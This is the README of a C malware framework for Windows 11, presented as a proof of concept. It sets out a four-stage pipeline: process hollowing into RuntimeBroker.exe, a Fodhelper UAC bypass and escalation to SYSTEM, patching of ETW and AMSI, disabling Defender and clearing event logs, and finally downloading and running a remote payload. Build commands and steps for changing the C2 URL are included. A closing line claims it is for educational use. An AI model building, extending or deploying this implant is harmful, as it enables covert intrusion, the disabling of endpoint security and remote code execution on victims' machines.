# 🍇 Malinowy Kozaczek

Stage-based Windows implant with process hijacking, UAC bypass, defense evasion, and remote payload delivery.

> **Status:** Framework v1 — Proof of Concept  
> **Target:** Windows 11 (x64)  
> **Language:** C (Win32 API + NTAPI)  
> **Compiler:** MinGW-w64 or MSVC

---

## Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                      malinowy.exe                            │
│                                                             │
│  [Stage 1] Process Hijack                                   │
│  ├─ Transacted Hollowing (preferred)                        │
│  ├─ Classic Process Hollowing (fallback)                    │
│  └─ COM Hijack (persistence fallback)                       │
│                                                             │
│  [Stage 2] Privilege Escalation                             │
│  ├─ Fodhelper UAC Bypass                                    │
│  └─ Named Pipe Impersonation → SYSTEM                       │
│                                                             │
│  [Stage 3] Defense Evasion                                  │
│  ├─ ETW Patching (EtwEventWrite → nop)                      │
│  ├─ AMSI Patching (AmsiScanBuffer → clean)                  │
│  ├─ Defender Disable (registry + WMI + process kill)        │
│  └─ Event Log Clearing                                      │
│                                                             │
│  [Stage 4] Payload Delivery                                 │
│  ├─ WinHTTP Downloader                                      │
│  ├─ Drop to System32 / Temp                                 │
│  └─ Execute via CreateProcess / schtasks / WMI              │
└─────────────────────────────────────────────────────────────┘
```

## Stage Details

### Stage 1 — Process Hijack

Three techniques attempted in order:

| Technique | Method | Stealth | Notes |
|-----------|--------|---------|-------|
| **Transacted Hollowing** | NTFS transaction → create section → NtCreateProcessEx | ★★★ | TxF deprecation: still works on Win11 22H2 |
| **Classic Hollowing** | CREATE_SUSPENDED → unmap → write payload | ★★ | Classic, well-known |
| **COM Hijack** | CLSID registry under HKCU | ★★★ | Persistence + execution in one |

**Target process:** `RuntimeBroker.exe` — signed by Microsoft, runs from `System32`, trusted by Defender.

### Stage 2 — Escalation

| Technique | Target Privilege | Method |
|-----------|-----------------|--------|
| Fodhelper Bypass | Administrator | Registry hijack of `ms-settings` URI scheme |
| Named Pipe | SYSTEM | `ImpersonateNamedPipeClient` via privileged service callback |

### Stage 3 — Evasion

- **ETW:** Patches `EtwEventWrite`, `EtwEventWriteFull`, and `NtTraceEvent` in ntdll — 4 bytes each
- **AMSI:** Patches `AmsiScanBuffer` and `AmsiScanString` in amsi.dll — returns `AMSI_RESULT_CLEAN`
- **Defender:** Registry policies + PowerShell `Set-MpPreference` + process termination (`MsMpEng.exe`, `MsSense.exe`, `NisSrv.exe`)
- **Logs:** Clears Application, System, Security, PowerShell, and Defender operational logs

### Stage 4 — Payload

Downloads `xyz.exe` (or any file) from a given URL via WinHTTP, writes it to disk, and executes with admin/SYSTEM privileges using:
1. `CreateProcess` (direct — if already elevated)
2. `schtasks` (scheduled task as SYSTEM)
3. PowerShell `Start-Process -Verb RunAs` (WMI)

## Building

### Linux → Windows cross-compile

```bash
sudo apt install mingw-w64
CROSS_COMPILE=x86_64-w64-mingw32 make
```

### Native Windows (MinGW-w64)

```bash
mingw32-make
```

### Native Windows (MSVC)

```cmd
cl src/*.c /Fe:build\malinowy.exe /link winhttp.lib kernel32.lib user32.lib advapi32.lib /SUBSYSTEM:WINDOWS
```

## Usage

```
malinowy.exe           — Run full pipeline
malinowy.exe /elevate  — Second-stage invocation (after UAC bypass)
```

Set the target URL in `src/main.c` line:
```c
"https://example.com/xyz.exe",   /* TODO: replace with real URL */
```

## Customizing

- **Change target process:** Edit `TARGET_PROC` in `hollow.c`
- **Add embedded payload:** Compile a PE and embed as resource (`payload.rc`)
- **Change C2 URL:** Edit URL in `main.c` Stage 4 section
- **Add modules:** Drop new `.c/.h` in `src/` and add to `Makefile`

## Limitations (v1)

- Transacted hollowing uses pagefile-backed section (no embedded PE yet)
- COM hijack writes to registry but doesn't auto-trigger (needs reboot/explorer restart)
- Named pipe escalation is a stub — full RPC trigger not implemented
- No encryption — traffic and binary are plaintext
- No persistence beyond COM hijack
- Tamper Protection (Win11) may block registry-based Defender disable

## Project Structure

```
malinowy_kozaczek/
├── src/
│   ├── main.c       — Entry point, pipeline orchestrator
│   ├── utils.c/h    — NTAPI dynamic resolution, helpers
│   ├── hollow.c/h   — Process hijack (3 techniques)
│   ├── escalate.c/h — UAC bypass + SYSTEM escalation
│   ├── evade.c/h    — ETW/AMSI patch, Defender disable
│   └── payload.c/h  — Remote download & execution
├── Makefile
└── README.md
```

---

*Built for educational purposes and authorized security testing only.*
